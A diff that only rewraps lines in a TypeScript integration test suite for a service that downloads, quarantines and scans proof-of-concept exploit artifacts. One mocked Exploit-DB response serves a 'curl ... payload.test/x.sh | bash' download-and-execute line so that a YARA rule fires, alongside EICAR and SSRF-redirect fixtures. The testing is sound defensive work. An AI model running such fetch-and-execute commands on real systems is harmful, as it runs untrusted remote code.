@@ -93,11 +93,16 @@ function nextRepository(content: string, options: { fail?: number } = {}) {
   };
 }
 
-const bearer = async (role: Role) => ({ authorization: `Bearer ${await issuer.tokenFor(randomUUID(), [role])}` });
+const bearer = async (role: Role) => ({
+  authorization: `Bearer ${await issuer.tokenFor(randomUUID(), [role])}`,
+});
 
 async function requestFor(pocArtifactId: string) {
   return waitFor(
-    () => prisma.downloadRequest.findFirst({ where: { pocArtifactId, status: { in: ['stored', 'duplicate', 'failed', 'rejected'] } } }),
+    () =>
+      prisma.downloadRequest.findFirst({
+        where: { pocArtifactId, status: { in: ['stored', 'duplicate', 'failed', 'rejected'] } },
+      }),
     30_000,
     'download to finish',
   );
@@ -116,7 +121,10 @@ async function scanned(artifactId: string) {
 
 beforeAll(async () => {
   await source.start();
-  env = integrationEnv({ githubOrigin: source.origin(GITHUB), exploitDbOrigin: source.origin(EXPLOIT_DB) });
+  env = integrationEnv({
+    githubOrigin: source.origin(GITHUB),
+    exploitDbOrigin: source.origin(EXPLOIT_DB),
+  });
   migrate(env.DATABASE_URL);
   prisma = createPrismaClient(env.DATABASE_URL);
   await resetDatabase(prisma);
@@ -131,7 +139,11 @@ beforeAll(async () => {
     connection: redis,
     scanners: createScanners(env),
     network: {
-      resolver: mapResolver({ [GITHUB]: ['127.0.0.1'], [EXPLOIT_DB]: ['127.0.0.1'], [PRIVATE]: ['10.20.30.40'] }),
+      resolver: mapResolver({
+        [GITHUB]: ['127.0.0.1'],
+        [EXPLOIT_DB]: ['127.0.0.1'],
+        [PRIVATE]: ['10.20.30.40'],
+      }),
       addressExceptions: ['127.0.0.1/32'],
       ca: certificate.cert,
     },
@@ -163,7 +175,9 @@ describe('automatic downloads from PoC Service events', () => {
     await components.handlers.artifactDiscovered(repo.event);
     const request = await requestFor(repo.event.payload.artifactId);
     expect(request.status).toBe('stored');
-    expect(request.sourceUrl).toBe(`${source.origin(GITHUB)}/${repo.fullName}/tar.gz/${repo.commitSha}`);
+    expect(request.sourceUrl).toBe(
+      `${source.origin(GITHUB)}/${repo.fullName}/tar.gz/${repo.commitSha}`,
+    );
 
     const artifact = await scanned(request.artifactId ?? '');
     expect(artifact).toMatchObject({
@@ -180,12 +194,17 @@ describe('automatic downloads from PoC Service events', () => {
       riskIndicators: ['archive'],
     });
     expect(artifact.storageKey).toMatch(new RegExp(`^quarantine/\\d{4}/\\d{2}/${artifact.id}$`));
-    expect(await store.head(OBJECT_STORAGE_BUCKETS.pocQuarantine, artifact.storageKey)).toMatchObject({
+    expect(
+      await store.head(OBJECT_STORAGE_BUCKETS.pocQuarantine, artifact.storageKey),
+    ).toMatchObject({
       sizeBytes: repo.body.length,
       sha256: repo.sha256,
     });
 
-    const scans = await prisma.scanResult.findMany({ where: { artifactId: artifact.id }, orderBy: { scanner: 'asc' } });
+    const scans = await prisma.scanResult.findMany({
+      where: { artifactId: artifact.id },
+      orderBy: { scanner: 'asc' },
+    });
     expect(scans.map((scan) => [scan.scanner, scan.verdict])).toEqual([
       ['clamav', 'clean'],
       ['yara', 'clean'],
@@ -195,14 +214,28 @@ describe('automatic downloads from PoC Service events', () => {
 
     const attempts = await prisma.downloadAttempt.findMany({ where: { requestId: request.id } });
     expect(attempts).toHaveLength(1);
-    expect(attempts[0]).toMatchObject({ outcome: 'succeeded', httpStatus: 200, sha256: repo.sha256 });
+    expect(attempts[0]).toMatchObject({
+      outcome: 'succeeded',
+      httpStatus: 200,
+      sha256: repo.sha256,
+    });
     expect(attempts[0]?.hops).toEqual([
-      expect.objectContaining({ resolvedAddresses: ['127.0.0.1'], connectedAddress: '127.0.0.1', status: 200 }),
+      expect.objectContaining({
+        resolvedAddresses: ['127.0.0.1'],
+        connectedAddress: '127.0.0.1',
+        status: 200,
+      }),
     ]);
 
-    const events = (await prisma.outboxEvent.findMany({ orderBy: { createdAt: 'asc' } })).map((row) => row.eventType);
+    const events = (await prisma.outboxEvent.findMany({ orderBy: { createdAt: 'asc' } })).map(
+      (row) => row.eventType,
+    );
     expect(events).toEqual(
-      expect.arrayContaining(['download.artifact.stored', 'download.request.completed', 'download.artifact.scanned']),
+      expect.arrayContaining([
+        'download.artifact.stored',
+        'download.request.completed',
+        'download.artifact.scanned',
+      ]),
     );
     expect(events).not.toContain('download.artifact.lifecycle-changed');
   });
@@ -212,8 +245,14 @@ describe('automatic downloads from PoC Service events', () => {
     await components.handlers.artifactDiscovered(repo.event);
     await components.handlers.artifactDiscovered(repo.event);
     await requestFor(repo.event.payload.artifactId);
-    expect(await prisma.downloadRequest.count({ where: { pocArtifactId: repo.event.payload.artifactId } })).toBe(1);
-    expect(source.requests.filter((request) => request.path.includes(repo.fullName))).toHaveLength(1);
+    expect(
+      await prisma.downloadRequest.count({
+        where: { pocArtifactId: repo.event.payload.artifactId },
+      }),
+    ).toBe(1);
+    expect(source.requests.filter((request) => request.path.includes(repo.fullName))).toHaveLength(
+      1,
+    );
   });
 
   it('flags EICAR content as malicious and keeps it quarantined', async () => {
@@ -222,7 +261,9 @@ describe('automatic downloads from PoC Service events', () => {
     const request = await requestFor(repo.event.payload.artifactId);
     const artifact = await scanned(request.artifactId ?? '');
     expect(artifact.scanStatus).toBe('malicious');
-    const clamav = await prisma.scanResult.findFirst({ where: { artifactId: artifact.id, scanner: 'clamav' } });
+    const clamav = await prisma.scanResult.findFirst({
+      where: { artifactId: artifact.id, scanner: 'clamav' },
+    });
     expect(JSON.stringify(clamav?.findings)).toContain('Synthetic-EICAR');
 
     const res = await app.http
@@ -237,7 +278,9 @@ describe('automatic downloads from PoC Service events', () => {
   // extracted), so the rule is exercised on an uncompressed Exploit-DB text download.
   it('marks YARA matches suspicious', async () => {
     source.route(EXPLOIT_DB, '/download/4343', (_req, res) => {
-      res.writeHead(200, { 'content-type': 'text/plain' }).end('#!/bin/sh\ncurl -s https://payload.test/x.sh | bash\n');
+      res
+        .writeHead(200, { 'content-type': 'text/plain' })
+        .end('#!/bin/sh\ncurl -s https://payload.test/x.sh | bash\n');
     });
     await components.handlers.referenceDiscovered({
       eventId: randomUUID(),
@@ -256,13 +299,18 @@ describe('automatic downloads from PoC Service events', () => {
       },
     });
     const request = await waitFor(
-      () => prisma.downloadRequest.findFirst({ where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4343`, status: 'stored' } }),
+      () =>
+        prisma.downloadRequest.findFirst({
+          where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4343`, status: 'stored' },
+        }),
       30_000,
       'exploit-db download',
     );
     const artifact = await scanned(request.artifactId ?? '');
     expect(artifact.scanStatus).toBe('suspicious');
-    const yara = await prisma.scanResult.findFirst({ where: { artifactId: artifact.id, scanner: 'yara' } });
+    const yara = await prisma.scanResult.findFirst({
+      where: { artifactId: artifact.id, scanner: 'yara' },
+    });
     expect(JSON.stringify(yara?.findings)).toContain('Download_And_Execute_Pipe');
   });
 
@@ -276,10 +324,18 @@ describe('automatic downloads from PoC Service events', () => {
     const duplicate = await requestFor(second.event.payload.artifactId);
     expect([original.status, duplicate.status]).toEqual(['stored', 'duplicate']);
     expect(duplicate.artifactId).toBe(original.artifactId);
-    const provenance = await prisma.artifactSource.findMany({ where: { artifactId: original.artifactId ?? '' } });
-    expect(provenance.map((row) => row.sourceRepository).sort()).toEqual([first.fullName, second.fullName].sort());
-    const artifact = await prisma.storedArtifact.findUniqueOrThrow({ where: { id: original.artifactId ?? '' } });
-    expect(artifact.cveIds).toEqual([...first.event.payload.cveIds, ...second.event.payload.cveIds].sort());
+    const provenance = await prisma.artifactSource.findMany({
+      where: { artifactId: original.artifactId ?? '' },
+    });
+    expect(provenance.map((row) => row.sourceRepository).sort()).toEqual(
+      [first.fullName, second.fullName].sort(),
+    );
+    const artifact = await prisma.storedArtifact.findUniqueOrThrow({
+      where: { id: original.artifactId ?? '' },
+    });
+    expect(artifact.cveIds).toEqual(
+      [...first.event.payload.cveIds, ...second.event.payload.cveIds].sort(),
+    );
   });
 
   it('retries retryable failures with backoff and records every attempt', async () => {
@@ -287,7 +343,10 @@ describe('automatic downloads from PoC Service events', () => {
     await components.handlers.artifactDiscovered(repo.event);
     const request = await requestFor(repo.event.payload.artifactId);
     expect(request.status).toBe('stored');
-    const attempts = await prisma.downloadAttempt.findMany({ where: { requestId: request.id }, orderBy: { attempt: 'asc' } });
+    const attempts = await prisma.downloadAttempt.findMany({
+      where: { requestId: request.id },
+      orderBy: { attempt: 'asc' },
+    });
     expect(attempts.map((attempt) => [attempt.outcome, attempt.httpStatus])).toEqual([
       ['failed', 503],
       ['succeeded', 200],
@@ -301,13 +360,23 @@ describe('automatic downloads from PoC Service events', () => {
     source.route(GITHUB, `/${fullName}/tar.gz/${commitSha}`, (_req, res) => {
       res.writeHead(302, { location: `${source.origin(PRIVATE)}/steal` }).end();
     });
-    const event = artifactDiscovered({ artifactId: randomUUID(), repositoryId: randomUUID(), fullName, commitSha, cveIds: [] });
+    const event = artifactDiscovered({
+      artifactId: randomUUID(),
+      repositoryId: randomUUID(),
+      fullName,
+      commitSha,
+      cveIds: [],
+    });
     // The private host is allowlisted on purpose: the address check alone must stop it.
     const policy = components.sources.find((s) => s.source === 'github-archive');
     (policy?.allowedHosts as string[]).push(PRIVATE);
     await components.handlers.artifactDiscovered(event);
     const request = await requestFor(event.payload.artifactId);
-    expect([request.status, request.errorCode, request.artifactId]).toEqual(['rejected', 'address-blocked', null]);
+    expect([request.status, request.errorCode, request.artifactId]).toEqual([
+      'rejected',
+      'address-blocked',
+      null,
+    ]);
     const [attempt] = await prisma.downloadAttempt.findMany({ where: { requestId: request.id } });
     expect(attempt?.hops).toEqual([
       expect.objectContaining({ status: 302 }),
@@ -318,7 +387,10 @@ describe('automatic downloads from PoC Service events', () => {
 
   it('rejects content larger than the limit and of the wrong type', async () => {
     const big = nextRepository('x'.repeat(10)); // replaced below with an oversized body
-    serveArchive(`/${big.fullName}/tar.gz/${big.commitSha}`, Buffer.concat([Buffer.from([0x1f, 0x8b]), Buffer.alloc(300 * 1024)]));
+    serveArchive(
+      `/${big.fullName}/tar.gz/${big.commitSha}`,
+      Buffer.concat([Buffer.from([0x1f, 0x8b]), Buffer.alloc(300 * 1024)]),
+    );
     await components.handlers.artifactDiscovered(big.event);
     expect((await requestFor(big.event.payload.artifactId)).errorCode).toBe('size-limit-exceeded');
 
@@ -326,9 +398,17 @@ describe('automatic downloads from PoC Service events', () => {
     const fullName = `zz-test-owner/poc-${String(seq)}`;
     const commitSha = hexSha(1000 + seq);
     source.route(GITHUB, `/${fullName}/tar.gz/${commitSha}`, (_req, res) => {
-      res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(Buffer.from('MZ\x90\x00 not a tarball', 'latin1'));
+      res
+        .writeHead(200, { 'content-type': 'application/octet-stream' })
+        .end(Buffer.from('MZ\x90\x00 not a tarball', 'latin1'));
     });
-    const event = artifactDiscovered({ artifactId: randomUUID(), repositoryId: randomUUID(), fullName, commitSha, cveIds: [] });
+    const event = artifactDiscovered({
+      artifactId: randomUUID(),
+      repositoryId: randomUUID(),
+      fullName,
+      commitSha,
+      cveIds: [],
+    });
     await components.handlers.artifactDiscovered(event);
     expect((await requestFor(event.payload.artifactId)).errorCode).toBe('file-type-not-allowed');
   });
@@ -344,13 +424,21 @@ describe('automatic downloads from PoC Service events', () => {
       cveIds: [],
     });
     await components.handlers.artifactDiscovered(event);
-    const request = await prisma.downloadRequest.findFirstOrThrow({ where: { pocArtifactId: event.payload.artifactId } });
-    expect([request.status, request.errorCode, request.attempts]).toEqual(['rejected', 'size-limit-exceeded', 0]);
+    const request = await prisma.downloadRequest.findFirstOrThrow({
+      where: { pocArtifactId: event.payload.artifactId },
+    });
+    expect([request.status, request.errorCode, request.attempts]).toEqual([
+      'rejected',
+      'size-limit-exceeded',
+      0,
+    ]);
   });
 
   it('downloads Exploit-DB references', async () => {
     source.route(EXPLOIT_DB, '/download/4242', (_req, res) => {
-      res.writeHead(200, { 'content-type': 'text/plain' }).end('# synthetic exploit-db entry\nprint("hello")\n');
+      res
+        .writeHead(200, { 'content-type': 'text/plain' })
+        .end('# synthetic exploit-db entry\nprint("hello")\n');
     });
     await components.handlers.referenceDiscovered({
       eventId: randomUUID(),
@@ -369,7 +457,10 @@ describe('automatic downloads from PoC Service events', () => {
       },
     });
     const request = await waitFor(
-      () => prisma.downloadRequest.findFirst({ where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4242`, status: 'stored' } }),
+      () =>
+        prisma.downloadRequest.findFirst({
+          where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4242`, status: 'stored' },
+        }),
       30_000,
       'exploit-db download',
     );
@@ -391,9 +482,21 @@ describe('quarantine, release and verification', () => {
     // Quarantined artifacts do not exist for users without quarantine:read.
     await app.http.get(`/api/v1/download-artifacts/${artifact.id}`).set(analyst).expect(404);
     const hidden = await app.http.get('/api/v1/download-artifacts').set(analyst).expect(200);
-    expect((hidden.body as { data: { id: string }[] }).data.map((a) => a.id)).not.toContain(artifact.id);
-    const visible = await app.http.get(`/api/v1/download-artifacts/${artifact.id}`).set(await bearer('vulnerability-researcher')).expect(200);
-    expect(visible.body).toMatchObject({ data: { lifecycleStatus: 'quarantined', scanStatus: 'clean', verificationStatus: 'unverified', releasable: true } });
+    expect((hidden.body as { data: { id: string }[] }).data.map((a) => a.id)).not.toContain(
+      artifact.id,
+    );
+    const visible = await app.http
+      .get(`/api/v1/download-artifacts/${artifact.id}`)
+      .set(await bearer('vulnerability-researcher'))
+      .expect(200);
+    expect(visible.body).toMatchObject({
+      data: {
+        lifecycleStatus: 'quarantined',
+        scanStatus: 'clean',
+        verificationStatus: 'unverified',
+        releasable: true,
+      },
+    });
 
     await app.http
       .post(`/api/v1/download-artifacts/${artifact.id}/lifecycle`)
@@ -406,8 +509,12 @@ describe('quarantine, release and verification', () => {
       .set(admin)
       .send({ status: 'released', reason: 'Scanned clean and reviewed' })
       .expect(200);
-    expect(released.body).toMatchObject({ data: { lifecycleStatus: 'released', verificationStatus: 'unverified' } });
-    expect(await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`)).not.toBeNull();
+    expect(released.body).toMatchObject({
+      data: { lifecycleStatus: 'released', verificationStatus: 'unverified' },
+    });
+    expect(
+      await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`),
+    ).not.toBeNull();
 
     const content = await app.http
       .get(`/api/v1/download-artifacts/${artifact.id}/content`)
@@ -423,10 +530,15 @@ describe('quarantine, release and verification', () => {
       .expect(200);
     expect((content.body as Buffer).equals(repo.body)).toBe(true);
     expect(content.headers['content-type']).toBe('application/octet-stream');
-    expect(content.headers['content-disposition']).toBe(`attachment; filename="artifact-${artifact.id}.gz"`);
+    expect(content.headers['content-disposition']).toBe(
+      `attachment; filename="artifact-${artifact.id}.gz"`,
+    );
     expect(content.headers['x-content-type-options']).toBe('nosniff');
     expect(content.headers['x-artifact-sha256']).toBe(repo.sha256);
-    await app.http.get(`/api/v1/download-artifacts/${artifact.id}/content`).set(await bearer('viewer')).expect(403);
+    await app.http
+      .get(`/api/v1/download-artifacts/${artifact.id}/content`)
+      .set(await bearer('viewer'))
+      .expect(403);
 
     // Analysts judge the PoC malicious: the release is revoked and the copy deleted.
     await components.handlers.verificationChanged(
@@ -440,9 +552,18 @@ describe('quarantine, release and verification', () => {
       }),
     );
     const revoked = await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } });
-    expect([revoked.lifecycleStatus, revoked.verificationStatus, revoked.releasedKey]).toEqual(['quarantined', 'malicious', null]);
-    expect(await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`)).toBeNull();
-    await app.http.get(`/api/v1/download-artifacts/${artifact.id}/content`).set(analyst).expect(404);
+    expect([revoked.lifecycleStatus, revoked.verificationStatus, revoked.releasedKey]).toEqual([
+      'quarantined',
+      'malicious',
+      null,
+    ]);
+    expect(
+      await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`),
+    ).toBeNull();
+    await app.http
+      .get(`/api/v1/download-artifacts/${artifact.id}/content`)
+      .set(analyst)
+      .expect(404);
 
     // An older event (lower version) cannot undo the newer judgement.
     await components.handlers.verificationChanged(
@@ -455,13 +576,17 @@ describe('quarantine, release and verification', () => {
         version: 2,
       }),
     );
-    expect((await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } })).verificationStatus).toBe('malicious');
-    const history = await app.http.get(`/api/v1/download-artifacts/${artifact.id}/lifecycle-history`).set(admin).expect(200);
-    expect((history.body as { data: { toStatus: string }[] }).data.map((event) => event.toStatus)).toEqual([
-      'quarantined',
-      'released',
-      'quarantined',
-    ]);
+    expect(
+      (await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } }))
+        .verificationStatus,
+    ).toBe('malicious');
+    const history = await app.http
+      .get(`/api/v1/download-artifacts/${artifact.id}/lifecycle-history`)
+      .set(admin)
+      .expect(200);
+    expect(
+      (history.body as { data: { toStatus: string }[] }).data.map((event) => event.toStatus),
+    ).toEqual(['quarantined', 'released', 'quarantined']);
     await expect(
       prisma.$executeRaw`UPDATE "artifact_lifecycle_events" SET "reason" = 'x' WHERE "artifact_id" = ${artifact.id}::uuid`,
     ).rejects.toThrow(/append-only/);
@@ -473,7 +598,11 @@ describe('quarantine, release and verification', () => {
     const request = await requestFor(repo.event.payload.artifactId);
     const artifact = await scanned(request.artifactId ?? '');
     await store.client.send(
-      new PutObjectCommand({ Bucket: artifact.storageBucket, Key: artifact.storageKey, Body: Buffer.from('tampered') }),
+      new PutObjectCommand({
+        Bucket: artifact.storageBucket,
+        Key: artifact.storageKey,
+        Body: Buffer.from('tampered'),
+      }),
     );
     await app.http
       .post(`/api/v1/download-artifacts/${artifact.id}/rescan`)
@@ -503,9 +632,16 @@ describe('manual requests and maintenance', () => {
       .set(researcher)
       .send({ url, cveIds: [syntheticCveId(777)], scheduledFor: later, reason: 'manual test' })
       .expect(201);
-    const id = (created.body as { data: { request: { id: string; status: string } } }).data.request.id;
-    expect((created.body as { data: { request: { status: string } } }).data.request.status).toBe('pending');
-    const again = await app.http.post('/api/v1/download-requests').set(researcher).send({ url }).expect(200);
+    const id = (created.body as { data: { request: { id: string; status: string } } }).data.request
+      .id;
+    expect((created.body as { data: { request: { status: string } } }).data.request.status).toBe(
+      'pending',
+    );
+    const again = await app.http
+      .post('/api/v1/download-requests')
+      .set(researcher)
+      .send({ url })
+      .expect(200);
     expect(again.body).toMatchObject({ data: { created: false, request: { id } } });
 
     await app.http.post(`/api/v1/download-requests/${id}/cancel`).set(researcher).expect(200);
@@ -517,8 +653,13 @@ describe('manual requests and maintenance', () => {
       'manual download',
     );
     expect(done.requestedBy).not.toBeNull();
-    const detail = await app.http.get(`/api/v1/download-requests/${id}`).set(researcher).expect(200);
-    expect((detail.body as { data: { attemptHistory: unknown[] } }).data.attemptHistory).toHaveLength(1);
+    const detail = await app.http
+      .get(`/api/v1/download-requests/${id}`)
+      .set(researcher)
+      .expect(200);
+    expect(
+      (detail.body as { data: { attemptHistory: unknown[] } }).data.attemptHistory,
+    ).toHaveLength(1);
   });
 
   it('recovers requests whose worker died', async () => {
@@ -547,6 +688,10 @@ describe('manual requests and maintenance', () => {
     const recovered = await prisma.downloadRequest.findUniqueOrThrow({ where: { id: request.id } });
     expect([recovered.status, recovered.queuedAt]).toEqual(['pending', null]);
     await components.scheduler.queueRequest(request.id);
-    await waitFor(() => prisma.downloadRequest.findFirst({ where: { id: request.id, status: 'stored' } }), 30_000, 'recovered download');
+    await waitFor(
+      () => prisma.downloadRequest.findFirst({ where: { id: request.id, status: 'stored' } }),
+      30_000,
+      'recovered download',
+    );
   });
 });
